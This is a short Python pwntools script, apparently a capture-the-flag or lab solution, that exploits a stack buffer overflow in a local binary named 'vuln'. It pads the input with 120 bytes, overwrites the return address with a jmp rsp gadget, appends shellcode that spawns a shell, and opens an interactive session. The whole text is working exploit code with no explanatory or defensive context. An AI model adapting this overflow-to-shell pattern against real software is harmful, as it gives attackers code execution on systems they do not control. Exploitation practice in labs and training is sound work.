from pwn import *
elf = context.binary = ELF("./vuln")
p = process()
offset = 120
jmp_rsp = p64(0x0000000000401161)
payload = b"A" * offset + jmp_rsp + asm(shellcraft.sh())
p.sendline(payload)
p.interactive()